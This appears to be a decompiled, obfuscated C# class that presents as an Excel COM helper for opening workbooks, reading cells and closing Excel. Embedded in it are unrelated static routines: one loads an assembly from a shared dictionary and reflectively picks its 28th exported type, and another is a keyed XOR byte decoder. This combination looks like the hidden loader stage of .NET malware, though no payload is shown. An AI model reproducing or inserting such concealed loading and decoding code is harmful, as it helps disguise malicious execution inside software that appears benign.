using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Ed3;
using Gs6;
using Microsoft.VisualBasic.CompilerServices;
using k3B;
using p3XA;
using t2Q;

namespace Br4;

public class r3T
{
	private j2Q _oXls;

	private t7K _oWBook;

	private Ds1 _oSheet;

	public j2Q OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public t7K OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Ds1 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public r3T()
	{
		_oXls = (j2Q)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void p3R(string Mr1, bool Tq9)
	{
		OWBook = OXls.Workbooks.Open(Mr1, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Tq9;
	}

	internal static bool Ce6()
	{
		try
		{
			try
			{
				Type type = (Type)Qn6(RuntimeHelpers.GetObjectValue(Zy9x.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Zy9x.mDic[Zy9x.tName].ToString(), false) == 0)
				{
					Zy9x.mDic.Add(Zy9x.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void g6E(string k2L)
	{
		OSheet = (Ds1)OWBook.Sheets[k2L];
	}

	public Hy1 b0C(int n8E, int Qi9)
	{
		return (Hy1)OSheet.Cells[n8E, Qi9];
	}

	public void n5A(bool Qd0)
	{
		if (OWBook != null)
		{
			OWBook.Close(Qd0, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		j2Q Hi = OXls;
		Gk3(ref Hi);
		OXls = Hi;
	}

	internal static byte Pi0(byte e0Q, byte[] z9W, int y0T, int b8B)
	{
		e0Q = (byte)(e0Q ^ checked((byte)(z9W[unchecked(b8B % z9W.Length)] ^ ((b8B + unchecked(y0T % z9W.Length)) & y0T))));
		return e0Q;
	}

	private static void Gk3<Lo3>(ref Lo3 Hi0, bool Cd5 = false) where Lo3 : class
	{
		if (Hi0 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Hi0))
			{
				if (Cd5)
				{
					Marshal.FinalReleaseComObject(Hi0);
				}
				else
				{
					Marshal.ReleaseComObject(Hi0);
				}
			}
		}
		finally
		{
			Hi0 = null;
		}
	}

	internal static object Qn6(object Mo8)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Mo8, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
